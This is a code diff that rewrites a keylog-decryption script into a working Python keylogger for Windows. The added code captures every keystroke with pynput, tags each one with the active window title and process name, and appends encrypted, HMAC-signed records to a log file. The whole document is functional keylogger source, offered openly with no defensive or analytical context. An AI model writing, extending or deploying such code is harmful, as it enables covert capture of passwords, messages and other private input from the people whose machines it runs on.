@@ -1,10 +1,16 @@
-# decrypt_keylog.py
+# keylogger_encrypted.py
 import os
 import json
 import base64
+import time
 import hmac
 import hashlib
+from pynput import keyboard
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes
+import psutil
+import win32gui
+import win32process
 
 KEY = os.environ.get("KEYLOGGER_AES_KEY")  # Must be 32 bytes
 HMAC_KEY = os.environ.get("KEYLOGGER_HMAC_KEY")  # Must be 32 bytes
@@ -16,32 +22,55 @@ if not KEY or not HMAC_KEY:
 KEY = base64.b64decode(KEY)
 HMAC_KEY = base64.b64decode(HMAC_KEY)
 
-def verify_hmac(encrypted: bytes, expected_hmac: bytes) -> bool:
-    computed_hmac = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
-    return hmac.compare_digest(computed_hmac, expected_hmac)
+running = True
 
-def decrypt_entry(nonce: bytes, encrypted: bytes) -> dict:
+def get_active_window_info():
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        process = psutil.Process(pid)
+        return win32gui.GetWindowText(hwnd), process.name()
+    except Exception:
+        return "Unknown", "Unknown"
+
+def encrypt_log_entry(entry: dict) -> str:
     aesgcm = AESGCM(KEY)
-    return json.loads(aesgcm.decrypt(nonce, encrypted, None))
+    nonce = os.urandom(12)
+    data = json.dumps(entry).encode()
+    encrypted = aesgcm.encrypt(nonce, data, None)
+    hmac_digest = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
+    log_record = {
+        "nonce": base64.b64encode(nonce).decode(),
+        "data": base64.b64encode(encrypted).decode(),
+        "hmac": base64.b64encode(hmac_digest).decode()
+    }
+    return json.dumps(log_record)
 
-def read_and_decrypt_logs():
-    with open(LOG_FILE, "r") as f:
-        for line in f:
-            try:
-                record = json.loads(line.strip())
-                nonce = base64.b64decode(record["nonce"])
-                data = base64.b64decode(record["data"])
-                hmac_sig = base64.b64decode(record["hmac"])
+def on_press(key):
+    global running
+    if key == keyboard.Key.esc:
+        running = False
+        print("[+] Logger stopped.")
+        return False
 
-                if not verify_hmac(data, hmac_sig):
-                    print("[!] Tampering detected in log entry.")
-                    continue
+    try:
+        k = key.char
+    except AttributeError:
+        k = str(key)
+    window_title, process_name = get_active_window_info()
+    entry = {
+        "timestamp": time.time(),
+        "key": k,
+        "window": window_title,
+        "process": process_name
+    }
+    with open(LOG_FILE, "a") as f:
+        f.write(encrypt_log_entry(entry) + "\n")
 
-                entry = decrypt_entry(nonce, data)
-                print(f"{entry['timestamp']} | {entry['process']} | {entry['window']} | {entry['key']}")
-
-            except Exception as e:
-                print(f"Error decrypting log: {e}")
+def main():
+    print("[+] Keylogger started. Press ESC to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 if __name__ == "__main__":
-    read_and_decrypt_logs()
+    main()
